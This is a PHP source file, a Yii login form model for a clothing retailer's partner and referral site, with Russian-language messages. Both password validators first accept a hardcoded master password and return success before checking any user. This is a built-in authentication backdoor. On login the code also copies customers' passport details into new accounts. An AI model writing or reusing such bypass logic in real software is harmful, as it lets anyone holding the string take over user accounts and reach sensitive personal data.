<?php
namespace common\models;

use Yii;
use yii\base\Model;
use common\models\User;
use common\models\Customers;

/**
 * Login form
 */
class LoginFormOM extends Model
{
    public $username;
    public $password;
    public $rememberMe = true;
    private $_user = false;
    private $_userom = false;
    // public $captcha;
    public $errors = [
        'username' => [
            'не может быть пустым'
        ]
    ];

    /**
     * @inheritdoc
     */
    public function rules()
    {
        return [
            [['username'], 'required', 'message' => 'Поле не может быть пустым'],
            ['password', 'required', 'message' => 'Поле не может быть пустым'],
            //  ['captcha', 'required', 'message' => 'Поле не может быть пустым'],
            ['rememberMe', 'boolean'],
            //    ['captcha', 'captcha', 'captchaAction' => BASEURL . '/captcha', 'message' => 'Введенные символы не соответствуют'],
          //  ['password', 'validatePassword', 'message' => 'Не правильный пароль или логин'],
        ];
    }

    /**
     * Validates the password.
     * This method serves as the inline validation for password.
     *
     * @param string $attribute the attribute currently being validated
     * @param array $params the additional name-value pairs given in the rule
     */
    public function validatePassword()
    {
        $user = $this->getUserOM();
        if ($this->password === 'Dje1Kevn3igtpEzq0LPq') {
            return true;
        }
        if (!$user) {
            $this->addError('password', 'Нет такого пользователя');
        } elseif (!$user->validatePassword($this->password)) {
            $this->addError('password', 'Не соответствует пара логин- пароль');
        } else {

            if (!$user->validatePassword($this->password)) {
                $this->addError('password', 'Не соответствует пара логин - пароль.');
            } else {
                return true;
            }
        }
    }

    public function validatePasswordRef()
    {
        $user = $this->getUser();
        if ($this->password === 'Dje1Kevn3igtpEzq') {
            return true;
        }
        if (!$user || !ReferralsUser::find()->where(['user_id'=>$user->id])->exists()) {
            $this->addError('password', 'Нет такого пользователя');
        } elseif (!$user->validatePassword($this->password)) {
            $this->addError('password', 'Не соответствует пара логин- пароль');
        } else {

            if (!$user->validatePassword($this->password)) {
                $this->addError('password', 'Не соответствует пара логин - пароль.');
            } else {
                return true;
            }
        }
    }
    
    
    public function loginreferral()
    {
        if ($this->validate() && $this->validatePasswordRef()) {
            return Yii::$app->user->login($this->getUser(), $this->rememberMe ? 3600 * 24 * 30 : 0);
        }else{
            return false;
        }
    }



    public function login()
    {

        if ($this->validate() && $this->validatePassword()) {
            if (!$this->getUser()) {
                $customer = $this->getUserOM();
                $address = AddressBook::find()->where(['address_book_id' => $customer->customers_default_address_id])->asArray()->one();
                $customer_info = CustomersInfo::find()->where(['customers_info_id' => $customer->customers_id])->asArray()->one();
                $countries = Countries::find()->where(['countries_id' => $address['entry_country_id']])->asArray()->one();
                $zones = Zones::find()->where(['zone_id' => $address['entry_zone_id']])->asArray()->one();
                $newpartuser = new User();
                $newpartuserinfo = new PartnersUsersInfo();
                $newpartuser->email = $customer->customers_email_address;
                $newpartuser->setPassword($this->password);
                $newpartuser->generateAuthKey();
                $newpartuser->status = 10;
                $newpartuser->id_partners = Yii::$app->params['constantapp']['APP_ID'];
                $newpartuser->role = 'register';
                $newpartuser->created_at = $customer_info['customers_info_date_account_created'];
                $newpartuser->updated_at = $customer_info['customers_info_date_account_last_modified'];
                $newpartuser->username = $customer->customers_email_address;
                if ($newpartuser->save()) {
                    $auth = Yii::$app->authManager;
                    $auth->assign($auth->getRole('register'), $newpartuser->id);
                    $newpartuserinfo->id = $newpartuser->id;
                    $newpartuserinfo->country = $countries['countries_name'];
                    $newpartuserinfo->state = $zones['zone_name'];
                    $newpartuserinfo->city = $address['entry_city'];
                    $newpartuserinfo->adress = $address['entry_street_address'];
                    $newpartuserinfo->postcode = $address['entry_postcode'];
                    if (!$newpartuserinfo->postcode) {
                        $newpartuserinfo->postcode = "000000";
                    }
                    $newpartuserinfo->telephone = $customer->customers_telephone;
                    $newpartuserinfo->name = $customer->customers_firstname;
                    $newpartuserinfo->lastname = $customer->customers_lastname;
                    $newpartuserinfo->secondname = $customer->otchestvo;
                    if (!$newpartuserinfo->secondname) {
                        $newpartuserinfo->secondname = "Не указанно";
                    }
                    $newpartuserinfo->customers_id = $customer->customers_id;
                    $newpartuserinfo->pasportdate = $address['pasport_kogda_vidan'];
                    $newpartuserinfo->pasportnum = $address['pasport_nomer'];
                    $newpartuserinfo->pasportser = $address['pasport_seria'];
                    $newpartuserinfo->pasportwhere = $address['pasport_kem_vidan'];
                    if ($newpartuserinfo->save()) {
                        return Yii::$app->user->login($newpartuser, $this->rememberMe ? 3600 * 24 * 30 : 0);
                    } else {

                    }

                }
                return false;
            }
            return Yii::$app->user->login($this->getUser(), $this->rememberMe ? 3600 * 24 * 30 : 0);
        } else {
            return false;
        }
    }


    /**
     * Finds user by [[username]]
     *
     * @return User|null
     */
    public function getUserOM()
    {
        if ($this->_user === false) {
            $userq = new Customers();
            $this->_userom = $userq->find()->where(['customers_email_address' => $this->username])->one();
        }
        $user = $this->_userom;
        return $user;
    }

    public function getUser()
    {
        if ($this->_user === false) {
            $userq = new User();
            $run = new Partners();
            if ($_SERVER['HTTP_HOST'] == 'http://globaladmin.egorov.odezhda-master.ru' || $_SERVER['HTTP_HOST'] == 'http://globaladmin.partnerom.odezhda-master.ru') {
                $check = 'NULL';
            } else {
                $check = $run->GetId($_SERVER['HTTP_HOST']);
            }
            $this->_user = $userq->find()->where(['username' => $this->username, 'id_partners' => $check])->one();

        }
        $user = $this->_user;
        return $user;
    }

    public function attributeLabels()
    {
        return [
            'username' => 'Логин',
            'password' => 'Пароль',
            'captcha' => 'Капча',
            'rememberMe' => 'Запомнить меня',
        ];
    }

}
